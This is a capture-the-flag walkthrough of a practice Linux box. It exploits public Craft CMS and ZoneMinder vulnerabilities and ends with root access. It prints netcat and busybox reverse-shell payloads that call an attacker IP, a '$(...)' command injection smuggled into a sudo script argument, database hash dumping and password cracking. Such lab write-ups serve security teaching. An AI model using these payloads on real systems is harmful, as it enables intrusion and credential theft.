# Box: Surveillance
# Level: Medium
# OS: Linux
<hr>

Lets get started


# Recon

## Portscanning

command:`sudo nmap -A -p- -v -T4 10.129.192.53`

![[Pasted image 20240220004724.png]]

From our nmap scan we have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on port 80.


# Enumeration

Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f7e2d82-43bb-4793-9980-3c8878e19be9)

Add `surveillance.htb` to your `/etc/hosts` file

Now lets navigate to the webpage again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1b1f0f88-f6a5-447b-92c3-0b5669d36a1f)

Cool. Lets fuzz for directories using ffuf

command:`ffuf -u "http://surveillance.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ae99880d-a231-4e8a-b26b-c5b089e7d69e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/617e77ea-0a6c-4511-9ef2-2cb0ac50e984)

oops, that's a lot of directory. The juicy one here would be `admin`.

Lets navigate to the `/admin` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/17ae1f10-4885-426a-8811-027d993ed849)

We have a login page, we can also see that the page is running on `craft cms`. Doing a quick research found a public exploit for this cms

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bfde5551-74c1-4ca3-81b6-8a2311f36440)

Lets go ahead to exploit this


# Exploitation

You can download the exploit from [here](https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py)

To run the exploit

command:`python exploit.py http://surveillance.htb/`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/87fd2425-c6bc-4c88-9843-5a67a0e4dc73)

We spawned a shell hehe. Lets get a proper shell by using the payload below

payload:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.165 1234 >/tmp/f`

Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/75a6bca6-290c-43d6-b33f-28ed09cbdc1e)

To stabilize the shell you can use the commands  below

```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z (To background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c434f52-ae88-4f79-9b91-c24a0a723ace)

Cool, now lets go ahead to escalate our privileges


# Privilege Escalation (To Matthew)

Running linpeas, found these interesting stuffs

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d388166c-55cd-478b-b298-4e15fdad0c47)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b2d9cef-110d-4ab4-a82d-bce5e0b8edf4)

These are database passwords

Lets try to connect to `craftdb`

command:`mysql -u craftuser -p`

password:`CraftCMSPassword2023!`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3ad53d6-c8a4-4b5a-b8b6-bbde9e4f68ee)

Nice Nice, we are connected hehe. Now lets try to dump the user table

```
show databases;
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0674fdb4-0ca0-4b31-aa6c-e2ac60ec11c7)

Now we can use the below commands to dump the user table

```
use craftdb;
show tables;
select id,username,fullname,email,password from users; 
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2d44147d-b8da-4c00-8bd7-1a67565b222a)

cool, we found a hashed password. But trust me I couldn't crack this just the same way I couldn't crack statics in school😅.

Moving on, I also found this interesting file from the output I got from linpeas

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b499ca69-d237-412d-8104-f254d7751905)

Lets download this to our machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9a081648-99c6-4705-9c39-6f9ef9a32fdf)

Now that we've downloaded it, lets unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a1fb8a02-e462-4894-82f0-8cced81cfdd3)

Well we actually have `2293` lines in this file.

If you recall when we dumped the database earlier we had a fullname `Matthew B`, this makes our search easier, so what we'll do is search for that name. Hopefully we get something juicy

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aeb516e0-160c-448e-98f9-5fbb17ba7cfd)

So we found that hash, lets identify it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d3445cfc-6cec-425e-b96d-042ce54a8088)

it is a `sha-256` hash, we can decrypt this using `john the ripper`

command:`john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-sha256`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/963408c8-bf2b-4651-ab5d-5f8af136d743)

We got the password to be `starcraft122490`

We can use this password to switch user to `matthew`

`username: matthew`            `password: starcraft122490`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a69a71b8-71af-4eec-9717-43e25815a2e0)

Lets further escalate our privileges

# Privilege Escalation (To Root)

Running the command `netstat -tulnp` you'll find out that there's a port `8080` running internally 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3cbce606-e70f-475d-872e-c278133132f1)

Lets portforward using ssh tunelling

command:`ssh -L 1234:127.0.0.1:8080 matthew@surveillance.htb -fN` 

`-fN`: These options tell SSH to go into the background (`-f`) and not execute any remote commands (`-N`). This is useful when you only want to establish the SSH tunnel without opening a shell session on the remote server.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3d3c8256-5b69-4b39-8fc7-546af782506a)

Now that we've done that lets navigate to the url `http://127.0.0.1:1234`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/935f576c-e9a2-409c-8453-2663bf6140eb)

We get this `ZoneMinder` login page

What's ZoneMinder??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58376b83-d1d6-4939-b858-a4f2fccab0fd)

So it is a free open-source software used for monitoring

Default creds `admin/admin` didn't work hehe. Lets look for public exploits

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/066069e7-fadd-4206-9919-3572959a7b39)

You can download the exploit we'll be using from [here](https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py)

To run the exploit

command:`python bankai.py -t http://127.0.0.1:1234/ -ip 10.10.14.165 -p 1337`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3483df7-74e8-4397-a7f4-cb80dfcc3159)

Cool. we spawned a reverse shell hehe

To stabilize the shell, use the commands

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cc303cc2-2e0f-46b8-9cd8-190d8c2753ef)

Now we can try to get root from here

Running  the command `sudo -l`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ca0094bd-345a-474c-8735-097a6a26dcae)

Now, all scripts related to application software can be run as sudo. So we need to find the particular script we can use

command:`find . -type f -name 'zm[a-zA-Z]*.pl'`

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a4554e86-1448-4123-8d37-4ab5161d97a1)

After a little research I found out that `zmupdate.pl` has a vulnerability

Lets use the help menu

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6bba096f-2c9f-4d92-b332-dcc970e78264)

So you'll need to specify a version. username and then a password. If you recall from our linpeas output we found the password of a `zm` database to be `ZoneMinderPassword2023`

The key aspect of this vulnerability is you can insert any command within the `$()` variable and the binary will execute it.

So we can execute a command like this

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bedfb145-366e-434e-ab03-b4323ac0b7bb)

As you can see we got a root shell but it is not responsive hehe.

Well, lets create a reverse shell using a busybox payload and send it over to the target machine

```sh
#!/bin/bash
busybox nc 10.10.14.165 4444 -e /bin/sh
```

Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb0cfa85-40da-4384-b63a-2f09bb618047)

Nice now lets run the `zmupdate.pl` script again

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploit.sh)' --pass=ZoneMinderPassword2023
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e910bfa-05f6-4a14-a134-a6e2ac65b2bf)

We spawned a root shell hehe

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dfb56b1-e3bd-46ab-841c-1aef00f0f722)

Box pwned successfully😎

